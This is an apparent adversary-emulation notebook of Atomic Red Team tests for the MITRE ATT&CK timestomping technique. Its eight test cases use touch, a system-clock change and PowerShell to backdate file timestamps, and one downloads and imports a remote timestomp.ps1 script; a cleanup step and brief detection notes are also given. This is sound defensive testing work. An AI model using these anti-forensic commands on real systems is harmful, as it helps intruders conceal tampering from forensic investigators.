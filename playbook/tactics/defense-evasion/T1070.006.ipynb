{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "3e2ea14d",
   "metadata": {},
   "source": "# T1070.006 - Timestomp\nAdversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)"
  },
  {
   "cell_type": "markdown",
   "id": "667e175f",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "c92681ac",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Set a file's access timestamp",
    "Stomps on the access timestamp of a file\n",
    "**Supported Platforms:** linux, macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ntouch -a -t 197001010000.00 /opt/filename\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f29c2f73",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "182c33f8",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Set a file's modification timestamp",
    "Stomps on the modification timestamp of a file\n",
    "**Supported Platforms:** linux, macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ntouch -m -t 197001010000.00 /opt/filename\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "310fa701",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "4e72d2b9",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Set a file's creation timestamp",
    "Stomps on the create timestamp of a file\n\nSetting the creation timestamp requires changing the system clock and reverting.\nSudo or root privileges are required to change date. Use with caution.\n",
    "**Supported Platforms:** linux, macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nNOW=$(date)\ndate -s \"1970-01-01 00:00:00\"\ntouch /opt/filename\ndate -s \"$NOW\"\nstat /opt/filename\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "32a73edf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "14cf70d3",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Modify file timestamps using reference file",
    "Modifies the `modify` and `access` timestamps using the timestamps of a specified reference file.\n\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n",
    "**Supported Platforms:** linux, macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ntouch -acmr /bin/sh /opt/filename\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "40500cf5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "5d0a51ee",
   "metadata": {},
   "source": "### Atomic Test #5 - Windows - Modify file creation timestamp with PowerShell\nModifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 1970.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: A file must exist at the path (#{file_path}) to change the creation time on\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:TEMP\\T1551.006_timestomp.txt) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Path $env:TEMP\\T1551.006_timestomp.txt -Force | Out-Null\nSet-Content $env:TEMP\\T1551.006_timestomp.txt -Value \"T1551.006 Timestomp\" -Force | Out-Null\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1db912ae",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "272a16f9",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-ChildItem $env:TEMP\\T1551.006_timestomp.txt | % { $_.CreationTime = \"01/01/1970 00:00:00\" }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8f925233",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "a4ae1249",
   "metadata": {},
   "source": "### Atomic Test #6 - Windows - Modify file last modified timestamp with PowerShell\nModifies the file last modified timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Modified time is the year 1970.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: A file must exist at the path (#{file_path}) to change the modified time on\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:TEMP\\T1551.006_timestomp.txt) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Path $env:TEMP\\T1551.006_timestomp.txt -Force | Out-Null\nSet-Content $env:TEMP\\T1551.006_timestomp.txt -Value \"T1551.006 Timestomp\" -Force | Out-Null\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "86f39d87",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "d11c1b16",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-ChildItem $env:TEMP\\T1551.006_timestomp.txt | % { $_.LastWriteTime = \"01/01/1970 00:00:00\" }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e4464bcb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "63cccf04",
   "metadata": {},
   "source": "### Atomic Test #7 - Windows - Modify file last access timestamp with PowerShell\nModifies the last access timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Accessed time is the year 1970.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: A file must exist at the path (#{file_path}) to change the last access time on\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:TEMP\\T1551.006_timestomp.txt) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Path $env:TEMP\\T1551.006_timestomp.txt -Force | Out-Null\nSet-Content $env:TEMP\\T1551.006_timestomp.txt -Value \"T1551.006 Timestomp\" -Force | Out-Null\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b3a532a6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "2c528597",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-ChildItem $env:TEMP\\T1551.006_timestomp.txt | % { $_.LastAccessTime = \"01/01/1970 00:00:00\" }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fb26235a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "962c1b02",
   "metadata": {},
   "source": "### Atomic Test #8 - Windows - Timestomp a File\nTimestomp kxwn.lock.\n\nSuccessful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. \n\n[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: timestomp.ps1 must be present in #{file_path}.\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:appdata\\Microsoft\\timestomp.ps1) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInvoke-WebRequest \"https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1\" -OutFile \"$env:appdata\\Microsoft\\timestomp.ps1\"\n\n```\n##### Description: kxwn.lock must be present in #{file_path}.\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path -path \"$env:appdata\\Microsoft\\kxwn.lock\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Path $env:appdata\\Microsoft\\kxwn.lock -ItemType File\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a4adc624",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "7f53a490",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nimport-module $env:appdata\\Microsoft\\timestomp.ps1\ntimestomp -dest \"$env:appdata\\Microsoft\\kxwn.lock\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6bbbc17a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "12fb2b51",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item $env:appdata\\Microsoft\\timestomp.ps1 -ErrorAction Ignore\nRemove-Item $env:appdata\\Microsoft\\kxwn.lock -ErrorAction Ignore```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2b1204c7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ccc2c6ff",
   "metadata": {},
   "source": "## Detection\nForensic techniques exist to detect aspects of files that have had their timestamps modified. (Citation: WindowsIR Anti-Forensic Techniques) It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}